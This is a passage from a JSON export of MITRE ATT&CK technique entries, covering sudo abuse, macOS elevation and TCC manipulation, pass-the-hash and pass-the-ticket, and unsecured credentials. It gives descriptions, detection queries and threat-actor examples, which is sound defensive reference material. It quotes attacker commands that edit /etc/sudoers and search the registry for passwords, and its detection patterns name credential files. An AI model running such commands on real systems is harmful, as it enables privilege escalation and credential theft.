    "Description": "Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.Within Linux and MacOS systems, sudo (sometimes referred to as \"superuser do\") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. Thesudocommand \"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\"[1]Since sudo was made for the system administrator, it has some useful configuration features such as atimestamp_timeout, which is the amount of time in minutes between instances ofsudobefore it will re-prompt for a password. This is becausesudohas the ability to cache credentials for a period of time. Sudo creates (or touches) a file at/var/db/sudowith a timestamp of when sudo was last run to determine this timeout. Additionally, there is atty_ticketsvariable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).The sudoers file,/etc/sudoers, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line likeuser1 ALL=(ALL) NOPASSWD: ALL.[2]Elevated privileges are required to edit this file though.Adversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example,/var/db/sudo's timestamp can be monitored to see if it falls within thetimestamp_timeoutrange. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, iftty_ticketsis disabled, adversaries can do this from any tty for that user.In the wild, malware has disabledtty_ticketsto potentially make scripting easier by issuingecho \\'Defaults !tty_tickets\\' >> /etc/sudoers.[3]In order for this change to be reflected, the malware also issuedkillall Terminal. As of macOS Sierra, the sudoers file hastty_ticketsenabled by default.",
    "Detects": [
      "Monitor executed commands and arguments that may perform sudo caching and/or use the sudoers file to elevate privileges, such as thesudocommand.",
      "On Linux, auditd can alert every time a user's actual ID and effective ID are different (this is what happens when you sudo). This technique is abusing normal functionality in macOS and Linux systems, but sudo has the ability to log all input and output based on theLOG_INPUTandLOG_OUTPUTdirectives in the/etc/sudoersfile.",
      "Monitor newly executed processes that may perform sudo caching and/or use the sudoers file to elevate privileges.",
      "Monitor contextual data about a running process, which may include information such as environment variables, image name, user/owner that may perform sudo caching and/or use the sudoers file to elevate privileges."
    ],
    "Procedure Examples": [
      "Cobalt Strikecan usesudoto run a command.[4]",
      "Dokaddsadmin  ALL=(ALL) NOPASSWD: ALLto the/etc/sudoersfile.[5]",
      "Protonmodifies the tty_tickets line in the sudoers file.[6]"
    ]
  },
  "T1548.004": {
    "Name": "Abuse Elevation Control Mechanism:Elevated Execution with Prompt",
    "Description": "Adversaries may leverage theAuthorizationExecuteWithPrivilegesAPI to escalate privileges by prompting the user for credentials.[1]The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating. This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified.Although this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.Adversaries may abuseAuthorizationExecuteWithPrivilegesto obtain root privileges in order to install malicious software on victims and install persistence mechanisms.[2][3][4]This technique may be combined withMasqueradingto trick the user into granting escalated privileges to malicious code.[2][3]This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.[2]",
    "Detects": [
      "Monitoring OS API callbacks for the execution can also be a way to detect this behavior but requires specialized security tooling.",
      "Consider monitoring for/usr/libexec/security_authtrampolineexecutions which may indicate thatAuthorizationExecuteWithPrivilegesis being executed. MacOS system logs may also indicate whenAuthorizationExecuteWithPrivilegesis being called."
    ],
    "Procedure Examples": [
      "OSX/Shlayercan escalate privileges to root by asking the user for credentials.[3]"
    ]
  },
  "T1548.005": {
    "Name": "Abuse Elevation Control Mechanism:Temporary Elevated Cloud Access",
    "Description": "Adversaries may abuse permission configurations that allow them to gain temporarily elevated access to cloud resources. Many cloud environments allow administrators to grant user or service accounts permission to request just-in-time access to roles, impersonate other accounts, pass roles onto resources and services, or otherwise gain short-term access to a set of privileges that may be distinct from their own.Just-in-time access is a mechanism for granting additional roles to cloud accounts in a granular, temporary manner. This allows accounts to operate with only the permissions they need on a daily basis, and to request additional permissions as necessary. Sometimes just-in-time access requests are configured to require manual approval, while other times the desired permissions are automatically granted.[1]Account impersonation allows user or service accounts to temporarily act with the permissions of another account. For example, in GCP users with theiam.serviceAccountTokenCreatorrole can create temporary access tokens or sign arbitrary payloads with the permissions of a service account, while service accounts with domain-wide delegation permission are permitted to impersonate Google Workspace accounts.[2][3][4][5]In Exchange Online, theApplicationImpersonationrole allows a service account to use the permissions associated with specified user accounts.[6]Many cloud environments also include mechanisms for users to pass roles to resources that allow them to perform tasks and authenticate to other services. While the user that creates the resource does not directly assume the role they pass to it, they may still be able to take advantage of the role's access -- for example, by configuring the resource to perform certain actions with the permissions it has been granted. In AWS, users with thePassRolepermission can allow a service they create to assume a given role, while in GCP, users with theiam.serviceAccountUserrole can attach a service account to a resource.[7][2]While users require specific role assignments in order to use any of these features, cloud administrators may misconfigure permissions. This could result in escalation paths that allow adversaries to gain access to resources beyond what was originally intended.[8][9]Note:this technique is distinct fromAdditional Cloud Roles, which involves assigning permanent roles to accounts rather than abusing existing permissions structures to gain temporarily elevated access to resources. However, adversaries that compromise a sufficiently privileged account may grant another account they controlAdditional Cloud Rolesthat would allow them to also abuse these features. This may also allow for greater stealth than would be had by directly using the highly privileged account, especially when logs do not clarify when role impersonation is taking place.[10]",
    "Detects": [
      "Log API calls to assume, create, or impersonate additional roles, policies, and permissions. Review uses of just-in-time access to ensure that any justifications provided are valid and only expected actions were taken."
    ],
    "Procedure Examples": [
      "Limit the privileges of cloud accounts to assume, create, or impersonate additional roles, policies, and permissions to only those required. Where just-in-time access is enabled, consider requiring manual approval for temporary elevation of privileges."
    ]
  },
  "T1548.006": {
    "Name": "Abuse Elevation Control Mechanism:TCC Manipulation",
    "Description": "Adversaries can manipulate or abuse the Transparency, Consent, & Control (TCC) service or database to grant malicious executables elevated permissions. TCC is a Privacy & Security macOS control mechanism used to determine if the running process has permission to access the data or services protected by TCC, such as screen sharing, camera, microphone, or Full Disk Access (FDA).When an application requests to access data or a service protected by TCC, the TCC daemon (tccd) checks the TCC database, located at/Library/Application Support/com.apple.TCC/TCC.db(and~/equivalent), and an overwrites file (if connected to an MDM) for existing permissions. If permissions do not exist, then the user is prompted to grant permission. Once permissions are granted, the database stores the application's permissions and will not prompt the user again unless reset. For example, when a web browser requests permissions to the user's webcam, once granted the web browser may not explicitly prompt the user again.[1]Adversaries may access restricted data or services protected by TCC through abusing applications previously granted permissions throughProcess Injectionor executing a malicious binary using another application. For example, adversaries can use Finder, a macOS native app with FDA permissions, to execute a maliciousAppleScript. When executing under the Finder App, the maliciousAppleScriptinherits access to all files on the system without requiring a user prompt. When System Integrity Protection (SIP) is disabled, TCC protections are also disabled. For a system without SIP enabled, adversaries can manipulate the TCC database to add permissions to their malicious executable through loading an adversary controlled TCC database using environment variables andLaunchctl.[2][3]",
    "Detects": [
      "Monitor executed commands and arguments that may abuse or modify TCC mechanisms designed to control access to elevated privileges. macOS system logs may also indicate whenAuthorizationExecuteWithPrivilegesis being called.",
      "Monitor for changes to files associated with TCC settings, such as/Library/Application Support/com.apple.TCC/TCC.dband the overwrites file.",
      "Monitor for abnormal processes executing under applications with elevated access."
    ],
    "Procedure Examples": [
      "For several modules,XCSSETattempts to access or list the contents of user folders such as Desktop, Downloads, and Documents. If the folder does not exist or access is denied, it enters a loop where it resets the TCC database and retries access.[4]"
    ]
  },
  "T1550": {
    "Name": "Use Alternate Authentication Material",
    "Description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls.Authentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.[1][2]Caching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system—either in memory or on disk—it may be at risk of being stolen throughCredential Accesstechniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.",
    "Detects": [
      "Monitor requests of new ticket granting ticket or service tickets to a Domain Controller, such as Windows EID 4769 or 4768, that may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls.",
      "Monitor for third-party application logging, messaging, and/or other artifacts that may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls.",
      "Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account.",
      "Monitor for an attempt by a user to gain access to a network or computing resource, often by providing credentials that may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls.",
      "Monitor for an attempt by a user to gain access to a network or computing resource by providing web credentials (ex: Windows EID 1202) that may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls."
    ],
    "Procedure Examples": [
      "FoggyWebcan allow abuse of a compromised AD FS server's SAML token.[3]",
      "During theSolarWinds Compromise,APT29used forged SAML tokens that allowed the actors to impersonate users and bypass MFA, enablingAPT29to access enterprise cloud applications and services.[4][5]"
    ]
  },
  "T1550.001": {
    "Name": "Use Alternate Authentication Material:Application Access Token",
    "Description": "Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users or services and used in lieu of login credentials.Application access tokens are used to make authorized API requests on behalf of a user or service and are commonly used to access resources in cloud, container-based applications, and software-as-a-service (SaaS).[1]OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.[2]For example, with a cloud-based email service, once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \"refresh\" token enabling background access is awarded.[3]With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.[4]Compromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. In AWS and GCP environments, adversaries can trigger a request for a short-lived access token with the privileges of another user account.[5][6]The adversary can then use this token to request data or perform actions the original account could not. If permissions for this feature are misconfigured – for example, by allowing all users to request a token for a particular account - an adversary may be able to gain initial access to a Cloud Account or escalate their privileges.[7]Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords.  For example, in AWS environments, an adversary who compromises a user’s AWS API credentials may be able to use thests:GetFederationTokenAPI call to create a federated user session, which will have the same permissions as the original user but may persist even if the original user credentials are deactivated.[8]Additionally, access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.",
    "Detects": [
      "Monitor the use of application access tokens to interact with resources or services that do not fit the organization baseline. For example, an application that is not meant to read emails accessing users’ mail boxes and potentially exfiltrating sensitive data, or a token associated with a cloud service account being used to make API calls from an IP address outside of the cloud environment.[18]In AWS environments, configure GuardDuty to alert when EC2 instance credentials are accessed from another AWS account or an external IP address.[19]"
    ],
    "Procedure Examples": [
      "APT28has used several malicious applications that abused OAuth access tokens to gain access to target email accounts, including Gmail and Yahoo Mail.[9]",
      "CreepyDrivecan use legitimate OAuth refresh tokens to authenticate with OneDrive.[10]",
      "HAFNIUMhas abused service principals with administrative permissions for data exfiltration.[11]",
      "Peiratescan use stolen service account tokens to perform its operations. It also enables adversaries to switch between valid service accounts.[12]",
      "During theSolarWinds Compromise,APT29used compromised service principals to make changes to the Office 365 environment.[13]"
    ]
  },
  "T1550.002": {
    "Name": "Use Alternate Authentication Material:Pass the Hash",
    "Description": "Adversaries may \"pass the hash\" using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.When performing PtH, valid password hashes for the account being used are captured using aCredential Accesstechnique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.Adversaries may also use stolen password hashes to \"overpass the hash.\" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to performPass the Ticketattacks.[1]",
    "Detects": [
      "Monitor requests of new ticket granting ticket or service tickets to a Domain Controller. Windows Security events such as 4768 (A Kerberos authentication ticket (TGT) was requested) and 4769 (A Kerberos service ticket was requested) combined with logon session creation information may be indicative of an overpass the hash attempt.",
      "Monitor newly created logons and credentials used in events and review for discrepancies. Unusual remote logins that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity.Note: Analytic Event ID is for Windows Security Log (Event ID 4624 - An account was successfully logged on). The successful use of Pass the Hash for lateral movement between workstations would trigger Event ID 4624, with an event level of Information, from the Windows Security log. This event would show an account logon with a LogonType of 3 using NTLM authentication, a logon that is not a domain logon, and the user account not being the ANONYMOUS LOGON account.Analytic 1 - Successful Local Account Login(sourcetype=\"WinEventLog:Security\" EventCode=\"4624\") LogonType=3 AND AuthenticationPackageName=\"NTLM\" AND TargetUser != \"ANONYMOUS LOGON\"",
      "Monitor for user authentication attempts. From a classic Pass-The-Hash perspective, this technique uses a hash through the NTLMv1 / NTLMv2 protocol to authenticate against a compromised endpoint. This technique does not touch Kerberos. Therefore, NTLM LogonType 3 authentications that are not associated to a domain login and are not anonymous logins are suspicious. From an Over-Pass-The-Hash perspective, an adversary wants to exchange the hash for a Kerberos authentication ticket (TGT). One way to do this is by creating a sacrificial logon session with dummy credentials (LogonType 9) and then inject the hash into that session which triggers the Kerberos authentication process."
    ],
    "Procedure Examples": [
      "TheAPT1group is known to have used pass the hash.[2]",
      "APT28has used pass the hash for lateral movement.[3]",
      "APT32has used pass the hash for lateral movement.[4]",
      "APT41uses tools such asMimikatzto enable lateral movement via captured password hashes.[5]",
      "Aquatic Pandaused a registry edit to enable a Windows feature calledRestrictedAdminin victim environments. This change allowedAquatic Pandato leverage \"pass the hash\" mechanisms as the alteration allows for RDP connections with a valid account name and hash only, without possessing a cleartext password value.[6]",
      "BADHATCHcan perform pass the hash on compromised machines with x64 versions.[7]",
      "Chimerahas dumped password hashes for use in pass the hash authentication attacks.[8]",
      "Cobalt Strikecan perform pass the hash.[9]",
      "CrackMapExeccan pass the hash to authenticate via SMB.[10]",
      "Ember Bearhas used pass-the-hash techniques for lateral movement in victim environments.[11]",
      "Empirecan perform pass the hash attacks.[12]",
      "FIN13has used the PowerShell utilityInvoke-SMBExecto execute the pass the hash method for lateral movement within an compromised environment.[13]",
      "GALLIUMused dumped hashes to authenticate to other machines via pass the hash.[14]",
      "HOPLIGHThas been observed loading several APIs associated with Pass the Hash.[15]",
      "Kimsukyhas used pass the hash for authentication to remote access software used in C2.[16]",
      "Mimikatz'sSEKURLSA::Pthmodule can impersonate a user, with only a password hash, to execute arbitrary commands.[17][18][19]",
      "DuringNight Dragon, threat actors used pass-the-hash tools to obtain authenticated access to sensitive internal desktops and servers.[20]",
      "Pass-The-Hash Toolkitcan perform pass the hash.[2]",
      "PoshC2has a number of modules that leverage pass the hash for lateral movement.[21]",
      "Wizard Spiderhas used theInvoke-SMBExecPowerShell cmdlet to execute the pass-the-hash technique and utilized stolen password hashes to move laterally.[22]"
    ]
  },
  "T1550.003": {
    "Name": "Use Alternate Authentication Material:Pass the Ticket",
    "Description": "Adversaries may \"pass the ticket\" using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.When preforming PtT, valid Kerberos tickets forValid Accountsare captured byOS Credential Dumping. A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.[1][2]ASilver Ticketcan be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).[1]AGolden Ticketcan be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.[3]Adversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, \"overpassing the hash\" involves using a NTLM password hash to authenticate as a user (i.e.Pass the Hash) while also using the password hash to create a valid Kerberos ticket.[4]",
    "Detects": [
      "Monitor requests of new ticket granting ticket or service tickets to a Domain Controller. Event ID 4769 is generated on the Domain Controller when using a golden ticket after the KRBTGT password has been reset twice, as mentioned in the mitigation section. The status code 0x1F indicates the action has failed due to \"Integrity check on decrypted field failed\" and indicates misuse by a previously invalidated golden ticket.[16]",
      "Monitor for newly constructed logon behavior that may \"pass the ticket\" using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls.",
      "Audit all Kerberos authentication and credential use events and review for discrepancies. Unusual remote authentication events that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity."
    ],
    "Procedure Examples": [
      "APT29used Kerberos ticket attacks for lateral movement.[5]",
      "APT32successfully gained remote access by using pass the ticket.[6]",
      "BRONZE BUTLERhas created forged Kerberos Ticket Granting Ticket (TGT) and Ticket Granting Service (TGS) tickets to maintain administrative access.[7]",
      "Mimikatz’sLSADUMP::DCSyncandKERBEROS::PTTmodules implement the three steps required to extract the krbtgt account hash and create/use Kerberos tickets.[8][9][10][11]",
      "Pupycan also perform pass-the-ticket.[12]",
      "SomeSeaDukesamples have a module to use pass the ticket with Kerberos for authentication.[13]"
    ]
  },
  "T1550.004": {
    "Name": "Use Alternate Authentication Material:Web Session Cookie",
    "Description": "Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.[1]Authentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained throughSteal Web Session CookieorWeb Cookies, the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform.There have been examples of malware targeting session cookies to bypass multi-factor authentication systems.[2]",
    "Detects": [
      "Monitor for third-party application logging, messaging, and/or other service artifacts that provide context of user authentication to web applications, including cloud-based services. Combine this information with web credentials usage events to identify authentication events that do not fit the organization baseline.",
      "Monitor for anomalous access of websites and cloud-based applications by the same user in different locations or by different systems that do not match expected configurations."
    ],
    "Procedure Examples": [
      "During theSolarWinds Compromise,APT29used stolen cookies to access cloud resources and a forgedduo-sidcookie to bypass MFA set on an email account.[3][4]",
      "Star Blizzardhas bypassed multi-factor authentication on victim email accounts by using session cookies stolen using EvilGinx.[5]"
    ]
  },
  "T1552": {
    "Name": "Unsecured Credentials",
    "Description": "Adversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g.Bash History), operating system or application-specific repositories (e.g.Credentials in Registry),  or other specialized files/artifacts (e.g.Private Keys).[1]",
    "Detects": [
      "Monitor application logs for activity that may highlight malicious attempts to access application data, especially abnormal search activity targeting passwords and other artifacts related to credentials.[12]Analytic 1 - Abnormal search activity targeting passwords and other credential artifacts.(index=third_party sourcetype IN (\"mailserver_logs\", \"webapp_logs\", \"appliance_logs\") (\"search\" OR \"query\" OR \"find\" OR \"grep\") (\"password\" OR \"credential\" OR \"key\" OR \"secret\" OR \"token\"))",
      "While detecting adversaries accessing credentials may be difficult without knowing they exist in the environment, it may be possible to detect adversary use of credentials they have obtained. Monitor the command-line arguments of executing processes for suspicious words or regular expressions that may indicate searching for a password (for example: password, pwd, login, secure, or credentials). SeeValid Accountsfor more information.Analytic 1 - Suspicious commands or regular expressions indicating credential search.(index=security sourcetype=\"Powershell\" EventCode=4104) OR(index=os sourcetype=\"linux_secure\" action=\"execve\") OR(index=os sourcetype=\"macos_secure\" event_type=\"execve\") | where match(CommandLine, \"(?i)(password|credential|secret|key|token|login|passwd|passphrase)\")",
      "Monitor for suspicious file access activity, specifically indications that a process is reading multiple files in a short amount of time and/or using command-line arguments indicative of searching for credential material (ex: regex patterns). These may be indicators of automated/scripted credential access behavior. Monitoring when the user's.bash_historyis read can help alert to suspicious activity. While users do typically rely on their history of commands, they often access this history through other utilities like \"history\" instead of commands likecat ~/.bash_history.Analytic 1 - Multiple file reads in a short period or searching for credential material.(index=security sourcetype=\"WinEventLog:Security\" EventCode=4663 ObjectName=\"password\" OR ObjectName=\"credential\") OR(index=sysmon sourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=11 TargetObject=\"password\" OR TargetObject=\"credential\") OR(index=os sourcetype=\"linux_audit\" action=\"open\" filepath IN (\"password\", \"credential\", \"passwd\", \"shadow\", \".pem\", \".key\")) OR(index=os sourcetype=\"macos_secure\" event_type=\"open\" file_path IN (\"password\", \"credential\", \"passwd\", \"shadow\", \".pem\", \".key\"))",
      "Monitor newly executed processes that may search compromised systems to find and obtain insecurely stored credentials.Analytic 1 - New processes with parameters indicating credential searches.(index=security sourcetype=\"WinEventLog:Security\" EventCode=4688 CommandLine=\"password\" OR CommandLine=\"credential\") OR(index=sysmon sourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=1 CommandLine=\"password\" OR CommandLine=\"credential\") OR(index=os sourcetype=\"linux_audit\" action=\"execve\" CommandLine=\"password\" OR CommandLine=\"credential\") OR(index=os sourcetype=\"macos_secure\" event_type=\"execve\" CommandLine=\"password\" OR CommandLine=\"credential\")",
      "Monitor for an attempt by a user to gain access to a network or computing resource, often by providing credentials that may search compromised systems to find and obtain insecurely stored credentials.Analytic 1 - Failed or unusual logon attempts using compromised credentials.(index=security sourcetype=\"WinEventLog:Security\" EventCode IN (4625, 4648)) OR(index=os sourcetype=\"linux_secure\" message=\"Failed password\" OR message=\"Invalid user\") OR(index=os sourcetype=\"macos_secure\" event_type=\"authentication_failure\" OR message=\"Failed to authenticate user\")",
      "Monitor for unexpected windows registry key being accessed that may search compromised systems to find and obtain insecurely stored credentials.Analytic 1 - Unauthorized access to registry keys associated with credentials.index=security sourcetype=\"WinEventLog:Microsoft-Windows-Security-Auditing\" EventCode=4663 ObjectType=\"Registry\" (ObjectName=\"password\" OR ObjectName=\"credential\") | eval AccessAttempt=case(    AccessMask=\"0x1\", \"Read\",    AccessMask=\"0x2\", \"Write\",    AccessMask=\"0x3\", \"Read/Write\",    AccessMask=\"0x4\", \"Delete\",    true(), \"Unknown\")"
    ],
    "Procedure Examples": [
      "Astarothuses an external software known as NetPass to recover passwords.[2]",
      "DarkGateuses NirSoft tools to steal user credentials from the infected machine.[3]NirSoft tools are executed via process hollowing in a newly-created instance of vbc.exe or regasm.exe.",
      "Leviathangathered credentials hardcoded in binaries located on victim devices duringLeviathan Australian Intrusions.[4]",
      "NPPSPYcaptures credentials by recording them through an alternative network listener registered to thempnotify.exeprocess, allowing for cleartext recording of logon information.[5]",
      "Pacucan search for sensitive data: for example, in Code Build environment variables, EC2 user data, and Cloud Formation templates.[6]",
      "Volt Typhoonhas obtained credentials insecurely stored on targeted network appliances.[7]"
    ]
  },
  "T1552.001": {
    "Name": "Unsecured Credentials:Credentials In Files",
    "Description": "Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.It is possible to extract passwords from backups or saved virtual machines throughOS Credential Dumping.[1]Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller.[2]In cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files.[3]They may also be found as parameters to deployment commands in container logs.[4]In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.[5]",
    "Detects": [
      "Monitor executed commands and arguments of executing processes for suspicious words or regular expressions that may indicate searching for a password (for example: password, pwd, login, secure, or credentials).Analytic 1 - Commands indicating credential searches in files.(index=security sourcetype=\"Powershell\" EventCode=4104 CommandLine=\"password\" OR CommandLine=\"credential\") OR(index=sysmon sourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=1 CommandLine=\"password\" OR CommandLine=\"credential\") OR(index=os sourcetype=\"linux_audit\" action=\"execve\" CommandLine=\"password\" OR CommandLine=\"credential\" OR CommandLine=\"passwd\" OR CommandLine=\"secret\") OR(index=os sourcetype=\"macos_secure\" event_type=\"execve\" CommandLine=\"password\" OR CommandLine=\"credential\" OR CommandLine=\"passwd\" OR CommandLine=\"secret\")",
      "Monitor for files being accessed that may search local file systems and remote file shares for files containing insecurely stored credentials. While detecting adversaries accessing these files may be difficult without knowing they exist in the first place, it may be possible to detect adversary use of credentials they have obtained.Analytic 1 - Unauthorized access to files containing credentials.(index=security sourcetype=\"WinEventLog:Security\" EventCode=4663 ObjectName IN (\"password\", \"credential\", \"secret\", \"token\")) OR(index=sysmon sourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=11 TargetObject IN (\"password\", \"credential\", \"secret\", \"token\")) OR(index=os sourcetype=\"linux_audit\" action=\"open\" filepath IN (\"password\", \"credential\", \"passwd\", \"shadow\", \".pem\", \".key\", \"secret\", \"token\")) OR(index=os sourcetype=\"macos_secure\" event_type=\"open\" file_path IN (\"password\", \"credential\", \"passwd\", \"shadow\", \".pem\", \".key\", \"secret\", \"token\"))",
      "Monitor newly executed processes for local file systems and remote file shares for files containing insecurely stored credentials.Note: Pseudocode Event IDs are for Sysmon (Event ID 1 - process create) and Windows Security Log (Event ID 4688 - a new process has been created). The Analytic looks for command-line instances of searching the Windows Registry for insecurely stored credentials. This can be accomplished using the query functionality of theRegsystem utility, by looking for keys and values that contain strings such as \"password\". In addition, adversaries may use toolkits such asPowerSploitin order to dump credentials from various applications such as IIS. Accordingly, this analytic looks for invocations of reg.exe in this capacity as well as that of several PowerSploit modules with similar functionality.Analytic 1 - Credentials in Files & Registry(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\")CommandLine=\"regquery HKLM /f password /t REG_SZ /s\" ORCommandLine=\"regquery HKCU /f password /t REG_SZ /s\" ORCommandLine=\"Get-UnattendedInstallFile\" ORCommandLine=\"Get-Webconfig\" ORCommandLine=\"Get-ApplicationHost\" ORCommandLine=\"Get-SiteListPassword\" ORCommandLine=\"Get-CachedGPPPassword\" ORCommandLine=\"Get-RegistryAutoLogon*\""
    ],
    "Procedure Examples": [
      "AADInternalscan gather unsecured credentials for Azure AD services, such as Azure AD Connect, from a local machine.[6]",
      "Agent Teslahas the ability to extract credentials from configuration or support files.[7]",
      "APT3has a tool that can locate credentials in files on the file system such as those from Firefox or Chrome.[8]",
      "APT33has used a variety of publicly available tools likeLaZagneto gather credentials.[9][10]",
      "Azorultcan steal credentials in files belonging to common software such as Skype, Telegram, and Steam.[11]",
      "BlackEnergyhas used a plug-in to gather credentials stored in files on the host by various software programs, including The Bat! email client, Outlook, and Windows Credential Store.[12][13]",
      "Ember Bearhas dumped configuration settings in accessed IP cameras including plaintext credentials.[14]",
      "Emotethas been observed leveraging a module that retrieves passwords stored on a system for the current logged-on user.[15][16]",
      "Empirecan use various modules to search for files containing passwords.[17]",
      "FIN13has obtained administrative credentials by browsing through local files on a compromised machine.[18]",
      "Fox Kittenhas accessed files to gain valid credentials.[19]",
      "Hildegardhas searched for SSH keys, Docker credentials, and Kubernetes service tokens.[3]",
      "Indrik Spiderhas searched files to obtain and exfiltrate credentials.[20]",
      "jRATcan capture passwords from common chat applications such as MSN Messenger, AOL, Instant Messenger, and and Google Talk.[21]",
      "Kimsukyhas used tools that are capable of obtaining credentials from saved mail.[22]",
      "LaZagnecan obtain credentials from chats, databases, mail, and WiFi.[23]",
      "Leafminerused several tools for retrieving login and password information, including LaZagne.[24]",
      "Leviathangathered credentials stored in files related to Building Management System (BMS) operations duringLeviathan Australian Intrusions.[25]",
      "MuddyWaterhas run a tool that steals passwords saved in victim email.[26]",
      "OilRighas used credential dumping tools such asLaZagneto steal credentials to accounts logged into the compromised system and to Outlook Web Access.[27][28][29][30]",
      "If an initial connectivity check fails,pngdownerattempts to extract proxy details and credentials from Windows Protected Storage and from the IE Credentials Store. This allows the adversary to use the proxy credentials for subsequent requests if they enable outbound HTTP access.[31]",
      "PoshC2contains modules for searching for passwords in local and remote files.[32]",
      "Pupycan use Lazagne for harvesting credentials.[33]",
      "Pysahas extracted credentials from the password database before encrypting the files.[34]",
      "QuasarRATcan obtain passwords from FTP clients.[35][36]",
      "RedCurlusedLaZagneto obtain passwords in files.[37][38]",
      "Scattered SpiderSpider searches for credential storage documentation on a compromised host.[39]",
      "Smoke Loadersearches for files named logins.json to parse for credentials.[40]",
      "StrelaStealersearches for and if found collects the contents of files such aslogins.jsonandkey4.dbin the$APPDATA%\\Thunderbird\\Profiles\\directory, associated with the Thunderbird email application.[41][42]",
      "TA505has used malware to gather credentials from FTP clients and Outlook.[43]",
      "TeamTNThas searched for unsecured AWS credentials and Docker API credentials.[44][45][46]",
